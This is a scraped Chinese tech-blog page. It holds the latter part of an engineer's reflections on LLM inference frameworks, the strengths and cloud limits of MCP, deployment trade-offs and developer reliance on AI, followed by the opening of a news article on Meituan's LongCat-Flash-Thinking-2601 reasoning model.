<p>此外还有一些框架：如ONNX Runtime适合部署在CPU服务器上，可开启多线程和内存优化，充分挖掘CPU性能；TorchServe则方便将PyTorch模型快速包装成服务API，便于在生产环境中部署推理服务。这些工具我也在不同项目中有所尝试。我的体会是，推理框架没有银弹，只有“合适”与否：简单应用不一定要用最重型的方案，资源充足时也别错过性能优化的机会。选型时应考虑团队技术基础、硬件条件和性能目标，在易用性与性能之间寻找最佳平衡。例如，小团队做原型时用Ollama快速跑通功能优先，产品上线面向大流量用户时再切换vLLM或TensorRT优化性能——先跑起来，再跑快起来，分阶段逐步升级，是我的一条经验法则。</p>
<h3 data-id="heading-3">三、MCP在本地智能体中的角色：反思与取舍</h3>
<p>今年AI圈有一个热点话题是 MCP 协议（Model Context Protocol）的兴起。Anthropic在2024年底开源了MCP，旨在为AI助手连接外部工具提供统一标准。我也第一时间投入了研究和实践，亲手开发了本地MCP服务器，并构建了一个LLM+MCP的工具链项目（比如一个论文检索和摘要生成的智能Agent）。经过这一年的折腾，我对“MCP到底是必需品还是过渡方案”有了一些思考和反悟。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/68ac99e961064454a636cade1be37cdd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZmFuc3R1Y2s=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769159604&amp;x-signature=4P1Zm3MvFDNmvy6W8XPagnZYW%2Fo%3D" alt="图片.png" loading="lazy"/></p>
<p>MCP是什么？ 简单来说，MCP提供了一种标准协议，让本地AI Agent可以方便地调用外部工具和数据源，相当于给桌面端的智能体安了一个“万能工具箱”接口。举个例子：本地的代码助手应用 Cursor 就通过MCP实现了动态插件加载，开发者不用为每个新工具写适配代码，只要遵循MCP协议，就能让Agent随时调用如代码搜索、文档查询、代码生成等各种能力。MCP的通信机制底层使用 SSE（Server-Sent Events）长连接配合 HTTP 短轮询的双通道模式，这种“客户端优先”的设计在本地环境中非常有效——长连接确保了工具调用的低延迟，动态发现机制则给予Agent几乎无限的扩展性。我在自己的实践中也验证了这些优点：基于MCP协议，我很快搭建了一个本地论文检索+摘要的Agent服务。MCP极大降低了接入论文数据库这种单一数据源工具的难度，只需简单配置就能稳定地调用工具；同时由于是在单机环境，SSE长连接运行十分稳定，没有遇到性能瓶颈。可以说，在本地单机/单用户场景下，MCP让开发AI助手变得前所未有的简单高效。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b3e9004c2b4e46568801cf203fb397a9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZmFuc3R1Y2s=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769159604&amp;x-signature=XxaLvXUBLV9dG6H%2B3CU%2FSIhd%2FpI%3D" alt="图片.png" loading="lazy"/></p>
<p>然而，MCP并非毫无短板。当我尝试将MCP应用到更大规模、分布式、高并发的环境中时，问题暴露无遗。在云端部署的知识库问答服务中，面对大量并发请求需要做负载均衡和多机分布。这时MCP的双连接模式成为了瓶颈：服务器需要维持海量SSE长连接，占用巨大资源，而且跨多个节点时工具寻址逻辑复杂低效。简单来说，MCP在云端扩展时不够“云原生”：长连接就像高速路上的单车道，连接一多就排队堵塞；每次HTTP短连接调用又不断建立/关闭，好比频繁开关临时岔路，增加额外延迟。对于一些实时性要求极高的场景（例如金融风控需要毫秒级响应），MCP现有方案几乎无法满足——光连接开销就可能拖慢系统，哪怕答案再准时也晚了。我认识的团队里就有尝试用MCP做云端Agent的，最后不得不放弃转向别的方案，因为MCP一上云就“水土不服”，性能压力和实现复杂度都难以接受。</p>
<p>那么，MCP是刚需还是过渡？ 我的观点是：它适合的场景非常明确，但超出边界就力不从心。在本地桌面、单机智能体领域，MCP确实填补了空白——提供了一个标准化、低门槛、高扩展性的工具调用框架，这方面它就是刚需，目前没有更好的替代品。但在云端大规模服务场景下，MCP暴露出的不足说明它更像一个过渡方案：业界需要新的技术路径（或者对MCP的大改进）来替代它。事实上，今年OpenAI推出的函数调用 (Function Calling)、LangChain等Agent编排框架、以及各类RAG检索增强方案，都在不同维度提供了替代思路：</p>
<ul>
<li>OpenAI函数调用：通过在提示中定义可用函数接口，让模型直接输出函数及参数来完成工具使用。这种方式对简单、标准化的工具（如查天气API、数据库查询）特别高效和精准。但缺点是不支持动态扩展新工具，也没有统一的发现和连接能力。所以对于需要灵活加载各种奇异工具的场景，函数调用替代不了MCP，但在调用明确API的场合，它要比MCP简单直接得多。</li>
<li>LangChain等Agent框架：LangChain在今年依然火热，它提供了高度灵活的Agent流程定制，可以组合多工具、多步骤推理。相比之下，MCP走的是标准化路线，上手快但不易深度定制。而LangChain几乎无所不能但实现复杂。我在评估项目需求时，如果工作流很复杂（需要条件分支、循环调用不同工具），会考虑LangChain这类框架；反之，如果只想快速给Agent插几个工具，MCP的简洁和低门槛更讨喜。</li>
<li>RAG（Retrieval-Augmented Generation）：RAG技术专注于给模型接入外部知识库检索，通过检索结果增强回答的准确性。在企业知识问答这类知识获取场景中，RAG往往效果比MCP好，因为它直接解决“让模型掌握知识”的问题。但RAG不涉及通用工具调用和交互，所以在动态工具加载、本地交互这些MCP擅长的领域，它并不能替代MCP。总的来说各有所长：MCP偏通用工具接口，RAG偏知识增强，各自服务不同目标。</li>
</ul>
<p>综合来看，没有哪个方案能一统天下。MCP、函数调用、LangChain、RAG...每个都在特定应用中表现优秀，也都有局限。今年我在项目中也常常需要取舍：本地用MCP方便，但上线云端换别的；有的功能用函数调用就够，就不引入复杂MCP等等。技术选型没有对错，只有适合与否。我的做法是先明确业务场景需求，再决定要不要用MCP。例如，公司内部开发者工具（单机版IDE助手），我会大胆采用MCP来获取开发效率的红利；但如果是大规模对外的在线服务，我倾向保守，除非MCP协议得到改进，否则会考虑更成熟高效的替代方案。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0ea103d6c0cd446b8419c6c0f435281d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZmFuc3R1Y2s=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769159604&amp;x-signature=f6uEXTha8YEKnfGej9yy8VElKYo%3D" alt="图片.png" loading="lazy"/></p>
<p>P来获取开发效率的红利；但如果是大规模对外的在线服务，我倾向保守，除非MCP协议得到改进，否则会考虑更成熟高效的替代方案。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7495421c56024bfca9cc5018cf9e04b0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZmFuc3R1Y2s=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769159604&amp;x-signature=rDCYAdL6etOEUVJxuUUfRdouHb8%3D" alt="" loading="lazy"/></p>
<ul>
<li>**</li>
<li>**</li>
<li>**</li>
<li/>
<li>**</li>
<li>**</li>
<li/>
<li>**</li>
<li/>
<li>**</li>
</ul>
<p>fig:</p>
<p>值得一提的是，MCP并非停滞不前。今年社区也在推进MCP的改进。例如讨论用 gRPC 取代 SSE 以降低通信延迟，提高并发能力；完善动态工具发现机制（比如引入工具市场和健康监测）以提升可靠性；以及融合其他技术的可能性——比如让MCP和函数调用、RAG结合，取长补短，形成混合型的新方案。未来的MCP可能脱胎换骨，也可能融入更大的生态。但在当下，理性看待MCP尤为重要：它不是万能药，也并非昙花一现的噱头。作为开发者，我们应清醒地根据自身业务需求来决定是否采用MCP，划定它的使用边界。正如我在思考后给出的结论——“桌面端用好MCP，云端慎用MCP”：在单机本地场景下MCP能快速带来生产力提升，而在大规模云服务里则需要慎重评估性能瓶颈，选择更合适的高性能方案。只有这样，才能让技术选型既发挥MCP的优势，又不被其局限所拖累，在实践中取得更高效、务实的成功。</p>
<h3 data-id="heading-4">四、大模型部署的平衡取舍：成本、性能与场景</h3>
<p>在大模型系统的部署过程中，我深刻体会到处处充满权衡取舍。模型越大越准但也越慢、硬件越强跑得越快但也越贵，云端服务强大却牺牲了本地自主……如何平衡这些维度，是每个工程决策必须面对的问题。这里我从几个常见角度总结我的经验：</p>
<ul>
<li>成本 vs 用户体验：很多时候，提升用户体验需要投入更多算力，意味着更高的成本。但如果一味省钱，用低配方案导致用户体验差，反过来会造成用户流失，商业损失更大。优化推理性能本质上是在拿计算成本换用户体验，而事实证明这笔账通常划算。正如前文电商案例展示的：增加GPU优化推理虽有成本，却显著提升了转化率，带来远超投入的收益。在我的项目决策中，会优先确保关键交互环节的体验：例如AI客服回复时间必须控制在2秒内，那么哪怕增加服务器开销也要做到，否则用户等不及走掉，损失更大。另一方面，也要合理控制成本：能通过算法优化解决的，不靠叠加硬件蛮力；能用较小模型满足需求的，不一定上最贵的GPT-4模型。举例来说，在一些日常问答场景下，我们选择用速度快、价格低的GPT-3.5模型替代GPT-4，因为后者虽然效果稍好但价格高出一个数量级，综合考虑3.5已经足够且响应更快。总之，要找到成本支出与体验收益的平衡点：既不给用户“省”体验，也不让成本无谓地飙升。</li>
<li>速度 vs 精度：响应速度和输出质量往往是此消彼长的关系。在交互式产品中，我体会到“快比全更重要”。用户更愿意迅速得到一个80分的答案，而不愿久等10秒才出100分答案。在实时性要求高的场景，我会优先牺牲一定精度来保证速度。例如在智能家居语音助手中，我们宁可用被量化/剪枝后略降精度的模型，也要确保问了就秒回。“答案再完美，迟到也是无用” 说的就是这个道理。当然，反过来在高精度要求的任务（如法律文书分析、医疗诊断），我会接受稍慢的推理，换用性能更强的大模型或 ensemble 方法确保万无一失。在这些情况下，还可以通过异步处理或分段加载等方式，在保持质量的同时部分掩盖延迟。例如某次我们做金融报告生成，采用了高精度的大模型离线生成初稿，然后让用户实时查看生成进度和中间结果，以降低主观等待时间。优化速度与保证质量是一对永恒张力，需要根据应用目的明确取舍：To be fast, or to be perfect? 我的经验是，对于大多数2B/2C应用，快和比较准比慢和极准更实用，毕竟绝大部分用户更在意效率，而不是学术竞赛式的极致准确。</li>
<li>边缘部署 vs 云推理：这是今年讨论很多的一个取舍点。边缘部署（例如在手机、浏览器、本地服务器上运行模型）带来的好处是数据隐私好、可离线运行、延迟低（没有网络开销），缺点是受设备算力限制模型必须足够小、性能有限。而云端推理可以动用强大算力跑超大模型，集中维护更新，但是需要网络连接且每次调用有额外延迟和成本。我的策略是按场景选择：如果应用强调隐私或长连接（如本地办公助手，希望数据不上传云端），我会尽量采用边缘部署的小模型。比如在手机端运行语音助手时，我用蒸馏和量化技术将模型压缩到可以在移动芯片上跑的程度，并借助诸如TensorFlow Lite、MNN 这类轻量推理框架，尽可能榨取手机CPU/GPU性能。实际效果虽然比不上云端大模型，但胜在随叫随用、零依赖，用户体验依然不错。而对于需要重模型支撑的服务，如客服机器人需要最强语言理解能力，那就只能上云用大模型，并通过负载均衡和多机并行来支持大流量。这种情况下成本会很高，我们会采取措施缓解：例如对常见简单问题用边缘/小模型先行处理，复杂请求再调云上大模型；或者对付费用户提供大模型高精度回答，免费用户用小模型粗略回答，以此控制总体成本。混合部署也是一种思路：边缘 + 云协同，各取所长。今年有不少相关探索，例如一些浏览器插件内置本地小模型快速响应，同时后台有云端强模型优化答案。我自己的体会是，边缘和云并非对立，而是可融合：关键看应用场景和用户诉求。在能够本地满足的场合，就让用户装个小模型享受0延迟；在本地跑不动的任务，就老老实实用云，把网络和费用的问题通过产品策略去平衡解决。</li>
</ul>
<p>在实践中，我常用一个原则四象限来帮助决策复杂的部署问题：场景导向、硬件匹配、成本平衡、扩展性预留。举个例子，我们曾帮一家自动驾驶公司部署车载目标检测模型——边缘硬件算力有限又要求实时性，这是个典型的“边缘低延迟”场景。我和团队综合考量后采取了组合策略：(1) 场景导向：首要优化延迟，因此对模型做了剪枝和量化处理以加速推理；(2) 硬件匹配：针对车载GPU的架构特点，使用Nvidia TensorRT对模型进一步优化编译，充分利用硬件加速；(3) 成本平衡：引入知识蒸馏训练了一个小模型，使系统对高端芯片依赖降低，如此在不影响效果前提下选用了性价比更高的芯片方案；(4) 扩展性：设计了可动态调整的流水线，并预留接口以便日后更换传感器或算法时快速适配。最终部署结果非常成功：每帧图像的处理延迟满足毫秒级要求，整车AI模块成本也控制在预算内，且具有良好的升级弹性。这个案例体现了多维度权衡的价值：只有同时关注场景需求、硬件特点、投入产出和未来演进，才能做出最优的工程决策。</p>
<p>总的来说，大模型部署就像在性能、精度、成本三者之间走钢丝，需要不断调整平衡点。没有完全完美的方案，只有最适合当下约束的方案。2025年的实践让我更加坚定这一观点：面对具体问题，先明确优先级，再兼顾次要目标，理性取舍。技术人最终要为业务结果服务，在保证核心价值的前提下，灵活运用各种优化和架构方式，把有限的资源发挥出最大的效能。</p>
<h3 data-id="heading-5">五、大模型与开发者：能力扩展与思维演进的个人反思</h3>
<p>这一年，大模型技术突飞猛进的同时，也深刻改变了开发者的工作范式和思维方式。作为一名AI工程师，我在实践中切身体会到自身角色定位的转变和认知边界的拓展与挑战。</p>
<p>首先，在开发AI系统的工作上，工程师的角色正在从传统的“算法构建者”转变为“大模型的驯养师和维护者”。以往我们写代码实现规则和算法，而现在更多的时候是利用海量数据训练模型、调整参数，让模型去自动学习。这意味着我不得不让渡出一部分对细节的掌控，相信模型通过数据自我优化的能力。典型的例子是超大模型里的某些决策机理，我们很难完全弄懂，模型越庞大就越像一个黑箱。这促使我更加关注AI系统的可解释性和对齐性问题：如何确保在追求能力的同时，人类仍握有“方向盘”，而不是任由AI演化失控。这一切正是“Software 2.0”范式带来的思考——当代码不再完全由人写出，而是由数据训练得来，我们需要重新定义人与软件的关系边界。</p>
<p>其次，在日常使用大模型辅助创作和编码方面，我的工作方式和能力边界也发生了变化。以前写代码完全靠自己一个字符一个字符敲，现在有了像GitHub Copilot这样的AI助手，“身边多了一个经验丰富的搭档”。我感觉自己的开发带宽被极大拓宽：可以更快学习陌生领域的知识，有AI帮忙生成初始代码框架，我就有更多精力投入架构和逻辑层面。这种人机协作确实提升了效率——一些研究也表明，引入AI工具后程序员的产出明显提高，初级工程师进步尤其大。类似地，在内容创作上，大模型帮我代笔初稿、提供灵感，我能够更快地产出高质量方案。然而，这种能力增强的另一面是对自身技能提升的隐忧。我发现自己现在花更多时间在审查和调试AI给出的结果，而从零思考和动手的机会减少了。对于有经验的人来说，这未必是坏事，我们可以利用节省下来的时间处理更高层次的问题；但对于新人来说，长期依赖AI自动补全，可能会忽略打牢基本功。我带团队的过程中就意识到，有些年轻工程师一上来就用现成模型解决问题，遇到新问题时如果AI也不懂，他们自己也缺乏独立分析的能力。这提醒我，在享受AI带来的便利时，必须警惕过度依赖导致的能力退化。</p>
<p>从更广阔的角度看，大模型给开发者带来了“能力延展”与“认知让渡”的张力。一方面，LLM是强大的认知扩展器。它让我们如虎添翼，每个人都能借助AI完成本来可能力所不及的任务。就像国际象棋中的“半人马”模式，人类棋手+AI能击败纯AI，可见人机结合能够创造1+1&gt;2的效果。这种协同让我相信，在理想情况下，大模型并非取代我们，而是帮我们成为更强的自己。我在2025年的工作中多次体会到这一点：当我把AI当成助手而非对手，我能更快地获取知识、解决问题、探索创新路径。正如有学者所说，我们和AI的关系正从简单的“我-工具”进化到“我-你”的合作伙伴关系——AI扩展了人的认知边界，人也在塑造着AI的行为。这种人机共生的新范式让我对未来充满期待。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/87007fecf9a94b2dadbeb20524f407dc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZmFuc3R1Y2s=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769159604&amp;x-signature=aV8d8YXyP1WkkRayfokVIQu2bBA%3D" alt="图片.png" loading="lazy"/></p>
<p>但另一方面，我们也不可忽视“认知主权”的让渡。当我们越来越依赖AI，会不会渐渐丧失自主思考的习惯？有研究警示说，频繁使用AI工具的人，其批判性思维得分显著下降。过度依赖导航会让人丧失方向感，类似地，过度依赖大模型会带来“认知卸载”现象——大脑因为省事把任务都丢给机器，久而久之思维能力可能退化。这一点我也有所警觉：当ChatGPT给出答案时，我是否还会本能地去验证、多想一步？当决策越来越依赖模型建议时，我是否在不知不觉中放弃了思考主导权？2025年的几次经历让我印象深刻：有次我们团队因为过分信赖模型输出的分析结论，险些做出错误决策，所幸及时发现模型其实给出了不正确的依据。这件事之后，我们加强了对AI输出的交叉验证和人审流程。我也在团队内部反复强调：AI再聪明，最后拍板的一定得是人。我们绝不能变成AI的执行者，而要让AI成为我们的工具。</p>
<p>保持批判性和掌控权是我在大模型时代给自己定下的准则。具体来说：第一，不把AI视作权威，对重要结果保持质疑，必要时查证模型回答的来源；第二，不让AI主导创造力输出，每当AI给出方案，我都会尝试自己提出改进或替代思路，确保自己大脑一直参与；第三，持续学习底层原理，哪怕模型封装得很好，我也尽量了解其基本工作机制（比如Transformer为什么会幻觉），这样遇到异常情况才能有独立判断。归根结底，我认同一句话：“工具并不可怕，可怕的是我们失去主动调适的意志”。面对大模型这把“双刃剑”，关键在于我们人类如何主动定位自己的角色——是让AI成为认知延长线，还是让AI牵着鼻子走。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f659aeb697ce41b2861c73791a3732fe~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZmFuc3R1Y2s=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769159604&amp;x-signature=0x9UuYU5pTHKlqMDe8oFiiH8MG0%3D" alt="图片.png" loading="lazy"/></p>
<p>让我欣慰的是，业界和社会已经开始重视这些问题。教育领域在讨论如何培养下一代具备AI素养：既会用AI又不迷信AI，保有创造力和批判精神。企业和监管层面也在制定伦理规范和使用指南，要求AI应用透明可控、保护数据隐私，防止过度依赖和滥用。这种“增强而非替代”的价值取向正在形成共识——即把大模型视为人类智能的扩展工具，而非智慧的替身。我个人在团队管理中，也开始有意识地打造人机协同的工作流程：鼓励大家用AI加速完成基础工作，但最终结果一定要经过人工复核和调整，以确保输出既高效又有人的创意和判断在里面。</p>
<p>最后，我想以我的亲身感悟作结：大模型既不是单纯的工具，也不是要取代我们的主人；它带领我们进入了人机共生的新阶段。在这个阶段中，技术的意义取决于使用者的初衷和方式。如果我们以主动、审慎的态度拥抱大模型，它会成为我们才能的延展，助力我们探索未知领域；反之，若我们不加分辨地沉迷于其便利，任其塑造认知，我们可能会在不经意间迷失自我。或许未来最理想的图景不是人机对立，而是你中有我、我中有你的协同进化——人类掌舵价值方向，AI提供前所未有的智慧和创造力，两者融合去完成任何一方单独都无法完成的宏图。正如有人所说，AI不一定是为了取代你——它可能是为了将你升级成为更好的自己。但这个“升级”的方向盘必须牢牢掌握在我们自己手中。展望未来，我坚信能力延展与认知主权并非不可兼得：唯有保持清醒与主动，我们开发者才能在这场巨变中既驾驭好技术之舟，又守护住宝贵的创造力之灯，真正实现与AI一起迈向更美好的明天。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[美团又上新模型，8个Thinker齐开工，能顶个诸葛亮？]]></title>    <link>https://juejin.cn/post/7595683968684261422</link>    <guid>https://juejin.cn/post/7595683968684261422</guid>    <pubDate>2026-01-16T10:37:19.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595683968684261422" data-draft-id="7595772638881169459" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="美团又上新模型，8个Thinker齐开工，能顶个诸葛亮？"/> <meta itemprop="keywords" content="人工智能,OpenAI"/> <meta itemprop="datePublished" content="2026-01-16T10:37:19.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="机器之心"/> <meta itemprop="url" content="https://juejin.cn/user/1873223543167902"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            美团又上新模型，8个Thinker齐开工，能顶个诸葛亮？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1873223543167902/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    机器之心
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-16T10:37:19.000Z" title="Fri Jan 16 2026 10:37:19 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读14分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>临近春节，各家 AI 厂商进入冲刺阶段，纷纷亮出最新大模型成果。</p>
<p>1 月 15 日，美团也重磅更新自家模型 ——LongCat-Flash-Thinking-2601。</p>
<p>这是一款强大高效的大规模推理模型，拥有 5600 亿个参数，基于创新的 MoE 架构构建。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/740e7d19a6954bdfa6fef537f8d6c355~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769164639&amp;x-signature=mefTuR5P7nltV1W02prto5oMNog%3D" alt="图片" loading="lazy"/></p>
<p>该模型引入了强大的重思考模式（Heavy Thinking Mode），能够同时启动 8 路思考并最终总结出一个更全面、更可靠的结论。目前重思考模式已在 LongCat AI 平台正式上线，人人均可体验。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d5fd2293599c4b6f8d1649c43fa21ddf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769164639&amp;x-signature=FCXkJKA%2BqLBm8bVSBNgLbPcjPkY%3D" alt="图片" loading="lazy"/></p>
<p>仅选择「深度思考」时才会触发重思考模式。</p>
<ul>
<li>
<p>体验链接：<a href="https://link.juejin.cn?target=https%3A%2F%2Flongcat.ai" target="_blank" title="https://longcat.ai" ref="nofollow noopener noreferrer">longcat.ai</a></p>
</li>
<li>
<p>模型地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fhuggingface.co%2Fmeituan-longcat%2FLongCat-Flash-Thinking-2601" target="_blank" title="https://huggingface.co/meituan-longcat/LongCat-Flash-Thinking-2601" ref="nofollow noopener noreferrer">huggingface.co/meituan-lon…</a></p>
</li>
<li>
<p>GitHub：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fmeituan-longcat%2FLongCat-Flash-Thinking-2601" target="_blank" title="https://github.com/meituan-longcat/LongCat-Flash-Thinking-2601" ref="nofollow noopener noreferrer">github.com/meituan-lon…</a></p>
</li>
</ul>
<p>不仅如此，该模型的智能体能力还获得了重大提升：在智能体工具调用、智能体搜索和工具集成推理等基准测试中达到顶尖性能，而且在任意的 OOD（分布外）真实智能体场景中实现了泛化能力的显著提升。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4cadf0c261d84c0d9ea15b83474b22b2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769164639&amp;x-signature=n4PTgsyl%2FpJD1OujV90TWaZZNPw%3D" alt="图片" loading="lazy"/></p>
<p>研究团队还专门提出了一种全新的智能体模型泛化能力评测方法。</p>
<p>通过构建自动化的环境和任务合成流程，基于给定关键词，随机生成任意的复杂任务。每个生成的任务都配备对应的工具集与可执行环境。</p>
<p>这种高度随机化的评测方式，能够更真实地检验模型在未知场景下的适应能力。</p>
<p>实验结果表明，LongCat-Flash-Thinking-2601 在该评测中始终保持领先性能。</p>
